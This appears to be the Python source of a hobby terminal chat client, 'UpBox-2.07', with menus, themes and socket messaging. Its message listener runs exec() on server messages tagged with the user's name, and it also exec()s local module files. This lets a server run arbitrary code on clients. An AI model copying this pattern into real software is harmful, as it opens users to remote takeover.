#libs
import json
import socket
import sys
import subprocess
from threading import Thread
import time
import keyboard as kb
from datetime import datetime
import random
import os
import re
import pyautogui

RESET = '\033[0m'
def get_color_escape(r, g, b, background=False):
    return '\033[{};2;{};{};{}m'.format(48 if background else 38, r, g, b)

#startup
subprocess.call('cls', shell=True)
print(f'\r{get_color_escape(255, 255, 255)}initializing'+get_color_escape(21, 170, 13)+'                [##                 ]', end='')


str11 = ["join server",
"select theme"]

def do_(xp):
    exec(xp)

count = 0
with open('themes.ini')as theme_count1:
        for x in theme_count1:
            count = count + 1

with open('themes.ini')as theme_list_file:
    theme_list = theme_list_file.readlines()

with open('themes.ini')as theme_list_file1:
    theme_name_list = theme_list_file1.read()

def print_there(x, y, text):
     sys.stdout.write("\x1b7\x1b[%d;%df%s\x1b8" % (x, y, text))
     sys.stdout.flush()

def add_menu_item(menu_name):
    str11.append(menu_name)

def add_menu_sel(command):
    exec(command)

nr1 = 0
nr2 = 0
module_l = []
with open('modules.ini')as modules_f:
    modules_s = modules_f.readlines()
for xs in modules_s:
    nr1 = nr1 + 1
    modules_ss = re.findall(r'\>.*?\<', modules_s[nr1-1])
    modules_ss = (str(modules_ss[0]).replace('>', '').replace('<', ''))
    if os.path.exists(f'modules\\{modules_ss}.dll') == True:
        with open(f'modules\\{modules_ss}.dll')as module_fd:
            module_sd = module_fd.read()
        exec(module_sd.split("':::'")[0])
        module_l.append(module_sd)


print(get_color_escape(255, 255, 255)+'\ropening settings.json'+get_color_escape(21, 170, 13)+'       [#####              ]', end='')

with open('settings\\settings.json') as settings_f:
    settings = json.load(settings_f)
selected_theme1 = settings['settings'][0]['theme']

with open(f'themes\\{selected_theme1}\\theme.json') as settings_f2:
    main_theme = json.load(settings_f2) 


print(get_color_escape(255, 255, 255)+'\rloading client items'+get_color_escape(21, 170, 13)+'        [###########        ]', end='')

#client theme
count_theme = 0
with open('themes.ini')as theme_count1:
        for x in theme_count1:
            count_theme = count_theme + 1

with open('themes.ini')as theme_list_file:
    theme_list = theme_list_file.readlines()

with open('themes.ini')as theme_list_file1:
    theme_name_list = theme_list_file1.read()

def select_theme(number1):
    global main_theme
    pyautogui.keyUp('enter')
    print(get_color_escape(main_theme['theme'][0]['fg']['red'], main_theme['theme'][0]['fg']['green'], main_theme['theme'][0]['fg']['blue']))
    subprocess.call('cls', shell=True)
    print(theme_name_list)
    if number1 == '':
        num1 = 1
        num2 = count_theme
        print_there(num1, 16, '<')
        while True:
            if kb.is_pressed('Down'):
                if num1 == count_theme:
                    print_there(num1, 16, '     ')
                    num1 = 1
                    print_there(num1, 16, '<')
                else:
                    print_there(num1, 16, '     ')
                    num1 = num1 + 1
                    print_there(num1, 16, '<')
                    time.sleep(.12)

            elif kb.is_pressed('Up'):
                if num1 == 0:
                    num1 = num2
                    print_there(num1, 16, '     ')
                    print_there(1, 16, '<')
                    time.sleep(.1)

                else:
                    print_there(num1, 16, '     ')
                    num1 = num1 - 1
                    print_there(num1, 16, '<')
                    time.sleep(.12)

            elif kb.is_pressed('Enter'):
                num3 = num1
                sel_theme = num3
                sel_theme_ = int(sel_theme) -1
                sel_theme = theme_list[sel_theme_]
                sel_theme = sel_theme.replace('\n', '')
                sel_theme1 = sel_theme
                sel_theme = {
                                "settings":[
                                    {
                                        "theme": sel_theme1
                                    }
                                ]
                            }  
                with open('settings\\settings.json', 'w') as theme_file:
                    json.dump(sel_theme, theme_file, indent=4)
                with open(f'themes\\{sel_theme1}\\theme.json')as theme_2:
                    main_theme = json.load(theme_2)
                subprocess.call('cls', shell=True)
                print(get_color_escape(main_theme['theme'][0]['fg']['red'], main_theme['theme'][0]['fg']['green'], main_theme['theme'][0]['fg']['blue']))
                select_theme(sel_theme_)


            elif kb.is_pressed('Ctrl+d'):
                num3 = num1
                sel_theme = num3
                sel_theme = int(sel_theme) - 1
                sel_theme_ds = theme_list[sel_theme]
                nn='\n'
                sel_str_ds = sel_theme_ds.replace(nn, '')
                sel_theme_ds = (f'themes\\{sel_str_ds}\\theme.pys')
                with open(sel_theme_ds)as sel_theme_f_ds:
                    theme_code_ds = json.load(sel_theme_f_ds)
                print_there(int(sel_theme+1), 16, f"> {theme_code_ds['theme'][0]['description']}")
                time.sleep(3)
                print_there(int(sel_theme+1), 16, '<                                                                                                                     ')
            elif kb.is_pressed('Esc'):
                menu1()





    else:
        num1 = number1 + 1
        num2 = count_theme
        print_there(num1, 16, '<')
        while True:
            if kb.is_pressed('Down'):
                if num1 == count_theme:
                    print_there(num1, 16, '     ')
                    num1 = 1
                    print_there(num1, 16, '<')
                else:
                    print_there(num1, 16, '     ')
                    num1 = num1 + 1
                    print_there(num1, 16, '<')
                    time.sleep(.12)
    
            elif kb.is_pressed('Up'):
                if num1 == 0:
                    num1 = num2
                    print_there(num1, 16, '     ')
                    print_there(1, 16, '<')
                    time.sleep(.1)
    
                else:
                    print_there(num1, 16, '     ')
                    num1 = num1 - 1
                    print_there(num1, 16, '<')
                    time.sleep(.12)
    
            elif kb.is_pressed('Enter'):
                num3 = num1
                sel_theme = num3
                sel_theme_ = int(sel_theme) -1
                sel_theme = theme_list[sel_theme_]
                sel_theme = sel_theme.replace('\n', '')
                sel_theme1 = sel_theme
                sel_theme = {
                                "settings":[
                                    {
                                        "theme": sel_theme
                                    }
                                ]
                            }  
                with open('settings\\settings.json', 'w') as theme_file:
                    json.dump(sel_theme, theme_file, indent=4)
                
                with open(f'themes\\{sel_theme1}\\theme.json') as settings_f2:
                    main_theme = json.load(settings_f2)
                subprocess.call('cls', shell=True)
                print(get_color_escape(main_theme['theme'][0]['fg']['red'], main_theme['theme'][0]['fg']['green'], main_theme['theme'][0]['fg']['blue']))
                select_theme(sel_theme_)
                
    
            elif kb.is_pressed('Ctrl+d'):
                num3 = num1
                sel_theme = num3
                sel_theme = int(sel_theme) - 1
                sel_theme_ds = theme_list[sel_theme]
                nn='\n'
                sel_str_ds = sel_theme_ds.replace(nn, '')
                sel_theme_ds = (f'themes\\{sel_str_ds}\\theme.pys')
                with open(sel_theme_ds)as sel_theme_f_ds:
                    theme_code_ds = json.load(sel_theme_f_ds)
                print_there(int(sel_theme+1), 16, f">  {theme_code_ds['theme'][0]['description']}")
                time.sleep(3)
                print_there(int(sel_theme+1), 16, '                                                                                                                     ')
                print_there(int(sel_theme+1), 16, '<')
            elif kb.is_pressed('Esc'):
                menu1()

#client server join

with open('data\\user.json') as user_data_f:
    user_data = json.load(user_data_f)

name = user_data['data'][0]['name']

def join_srv(name1, address1):
    pyautogui.keyUp('enter')
    address1 = address1.split(':')
    opt1 = '/'+name1+'/'
    opt2 = '//'+name1
    name123 = f'[{name1}]'
    SERVER_HOST = address1[0]
    SERVER_PORT = int(address1[1])
    separator_token = ": "

    s = socket.socket()

    print(f"[CLiENT] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
    s.connect((SERVER_HOST, SERVER_PORT))
    print("[SERVER] Connected.")
    s.send(name1.encode())

    for cx0 in range(len(module_l)):
        exec(module_l[cx0].split("':::'")[2])

    def listen_for_messages():
        while True:
            message = s.recv(1024).decode()
            print(get_color_escape(main_theme['client'][0]['server color']['red'], main_theme['client'][0]['server color']['green'], main_theme['client'][0]['server color']['blue']))

            if opt2 in message:
                epr = message.replace(opt2, "")
                print(epr)

            elif opt1 in message:
                cmd = str(message)
                cmd = cmd.replace(opt1, '')
                exec(cmd.replace('; ', '\n').replace(';', '\n'))
            
            elif '//' in message:
                print("\n" + message)

            elif name123 in message:
                print(get_color_escape(main_theme['client'][0]['client color']['red'], main_theme['client'][0]['client color']['green'], main_theme['client'][0]['client color']['blue'])+name123+get_color_escape(main_theme['theme'][0]['fg']['red'], main_theme['theme'][0]['fg']['green'], main_theme['theme'][0]['fg']['blue']) + message.replace(name123, ' '))

            else:
                message_s = re.findall(r'\[.*?\]', message)
                message = message.replace(f'{message_s[0]} ', '')
                print(get_color_escape(main_theme['client'][0]['server color']['red'],main_theme['client'][0]['server color']['green'],main_theme['client'][0]['server color']['blue'])+"\n"+message_s[0],get_color_escape(main_theme['theme'][0]['fg']['red'],main_theme['theme'][0]['fg']['green'],main_theme['theme'][0]['fg']['blue']),message)
    t = Thread(target=listen_for_messages)
    t.daemon = True
    t.start()

    pyautogui.keyUp('enter')

    while True:
        print(get_color_escape(main_theme['client'][0]['client color']['red'], main_theme['client'][0]['client color']['green'], main_theme['client'][0]['client color']['blue']))
        to_send = input()

        if to_send == '/q':
            s.send(f'[SERVER] [{name} left]'.encode()) 
            print(f'{get_color_escape(21, 170, 13)}[CLIENT]{get_color_escape(255, 255, 255)} quitting')
            quit()
        
        elif '[SERVER]' in to_send:
            print('you cannot use the variable: [SERVER]')
            
        elif '[server]' in to_send:
            print('you cannot use the variable: [server]')

        elif '//' in to_send:
            to_send = to_send.replace('//', '')
            to_send = f'//[{name}]={to_send}'
            s.send(to_send.encode())
        else:
            to_send = f"[{name}] {to_send}"
            s.send(to_send.encode())
    s.close()


print(get_color_escape(255, 255, 255)+'\ropening server.ini'+get_color_escape(21, 170, 13)+'          [################   ]', end='')
with open('server.ini')as srv_list_file1:
    srv_name_list = srv_list_file1.read()

with open('server.ini')as srv_list_file:
    srv_list = srv_list_file.readlines()
    time.sleep(.4)

count = 0
with open('server.ini')as srv_count1:
        for x in srv_count1:
            count = count + 1

time.sleep(.4)
print(get_color_escape(255, 255, 255)+'\rloading server.ini'+get_color_escape(21, 170, 13)+'          [###################]', end='')

def select_server():
    pyautogui.keyUp('enter')
    subprocess.call('cls', shell=True)
    print(srv_name_list)
    num1 = 1
    num2 = count
    print_there(1, 16, '<')
    while True:
        if kb.is_pressed('Down'):
            if num1 == num2:
                print_there(num1, 16, '     ')
                num1 = 1
                print_there(num1, 16, '<')
            else:
                print_there(num1, 16, '     ')
                num1 = num1 + 1
                print_there(num1, 16, '<')
                time.sleep(.12)

        elif kb.is_pressed('Up'):
            if num1 == 0:
                num1 = num2
                print_there(num1, 16, '     ')
                print_there(1, 16, '<')
                time.sleep(.1)

            else:
                print_there(num1, 16, '     ')
                num1 = num1 - 1
                print_there(num1, 16, '<')
                time.sleep(.12)

        elif kb.is_pressed('Enter'):
            num3 = num1
            sel_srv = num3
            sel_srv = int(sel_srv) - 1
            sel_srv = srv_list[sel_srv]
            nn='\n'
            sel_str = sel_srv.replace(nn, '')
            sel_srv = (f'servers\\{sel_str}.srv')
            with open(sel_srv) as addrfile:
                address = addrfile.read()
            join_srv(name, address)
        elif kb.is_pressed('Ctrl+d'):
            num3 = num1
            sel_srv = num3
            sel_srv1 = int(sel_srv) - 1
            sel_srv = srv_list[sel_srv1]
            nn='\n'
            sel_str = sel_srv.replace(nn, '')
            sel_srv_json = (f'servers\\{sel_str}.json')
            with open(sel_srv_json)as sel_srv_json_f:
                srv_ds = json.load(sel_srv_json_f)
            print_there(int(sel_srv1+1), 16, f"> {srv_ds['server'][0]['description']}")
            time.sleep(3)
            print_there(int(sel_srv1+1), 16, '<                                                                                                                     ')

        elif kb.is_pressed('Ctrl+t'):
            num3 = num1
            sel_srv = num3
            sel_srv1 = int(sel_srv) - 1
            sel_srv = srv_list[sel_srv1]
            nn='\n'
            sel_str = sel_srv.replace(nn, '')
            sel_srv_json = (f'servers\\{sel_str}.json')
            with open(sel_srv_json)as sel_srv_json_f:
                srv_ds = json.load(sel_srv_json_f)
            print_there(int(sel_srv1+1), 16, f"> {srv_ds['server'][0]['address']}")
            time.sleep(3)
            print_there(int(sel_srv1+1), 16, '<                                                                                                                     ')
        elif kb.is_pressed('Esc'):
                menu1()


        

print('\r                                                                                      ', end='')


subprocess.call('cls', shell=True)
copyright1 = """
 /$$   /$$           /$$$$$$$                             /$$$$$$       /$$$$$$ 
| $$  | $$          | $$__  $$                           /$$__  $$     /$$$_  $$
| $$  | $$  /$$$$$$ | $$  \ $$  /$$$$$$  /$$   /$$      |__/  \ $$    | $$$$\ $$
| $$  | $$ /$$__  $$| $$$$$$$  /$$__  $$|  $$ /$$//$$$$$$ /$$$$$$/    | $$ $$ $$
| $$  | $$| $$  \ $$| $$__  $$| $$  \ $$ \  $$$$/|______//$$____/     | $$\ $$$$
| $$  | $$| $$  | $$| $$  \ $$| $$  | $$  >$$  $$       | $$          | $$ \ $$$
|  $$$$$$/| $$$$$$$/| $$$$$$$/|  $$$$$$/ /$$/\  $$      | $$$$$$$$ /$$|  $$$$$$/
 \______/ | $$____/ |_______/  \______/ |__/  \__/      |________/|__/ \______/ 
          | $$                                                                  
          | $$                                                                  
          |__/  

release: v2.07
github: @klestyselimay
youtube: @klesty selimay"""



newjson = {
    "data":[
        {
        "name": name,
        "type": "normal"
        }
    ]
}
print(get_color_escape(main_theme['theme'][0]['fg']['red'], main_theme['theme'][0]['fg']['green'], main_theme['theme'][0]['fg']['blue']))

if name == 'user':
    while True:
            print('please enter a name \n')
            nm = input('enter a name: ')
            if nm == '':
                continue
            elif nm == name:
                continue
            else:
                newname = {
                        "data": [
                            {
                                "name": nm,
                                "type": "new"
                            }
                        ]
                    }

            with open('data\\user.json', 'w')as user_2:
                json.dump(newname, user_2, indent=4)
            print(get_color_escape(255, 255, 255))
            quit()

print(copyright1+"\n"+"\n")
if user_data['data'][0]['type'] == 'new':
    print('Hello There '+user_data['data'][0]['name']+' Welcome To UpBox-2.07!'+'\n')
    with open('data\\user.json', 'w')as user_1:
        json.dump(newjson, user_1, indent=4)
else:
    print('Welcome Back '+user_data['data'][0]['name']+'!')

for cx1p in range(len(module_l)):
    exec(module_l[cx1p].split("':::'")[1])

print('\n')
print('Hit Enter To Continue.\n\n')
def start1():
    while True:
        if kb.read_key() == 'enter':
            break
time.sleep(.5)
start1()

sel_opt_str = ''

for cx1 in range(len(module_l)):
    exec(module_l[cx1].split("':::'")[2])

def menu1():
    global sel_opt_str
    pyautogui.keyUp('enter')
    subprocess.call('cls', shell=True)
    for xpl in str11:
        print(xpl)

    num1 = 1
    num2 = len(str11)
    print_there(1, 16, '<')
    while True:
        if kb.is_pressed('Down'):
            if num1 == num2:
                print_there(num1, 16, '     ')
                num1 = num1 - len(str11)
                print_there(1, 16, '<')
            else:
                print_there(num1, 16, '     ')
                num1 = num1 + 1
                print_there(num1, 16, '<')
                time.sleep(.12)

        elif kb.is_pressed('Up'):
            if num1 == 1:
                print_there(num1, 16, '     ')
                num1 = num2
                print_there(num1, 16, '<')
                time.sleep(.1)

            else:
                print_there(num1, 16, '     ')
                num1 = num1 - 1
                print_there(num1, 16, '<')
                time.sleep(.12)

        elif kb.is_pressed('Enter'):
            num3 = num1
            sel_opt = num3
            sel_opt = int(sel_opt) - 1
            sel_opt_str = str11[sel_opt]
            if sel_opt_str == 'join server':
                select_server()
            elif sel_opt_str == 'select theme':
                select_theme('')

            for cx2 in range(len(module_l)):
                exec(module_l[cx2].split("':::'")[2])
time.sleep(.1)
menu1()
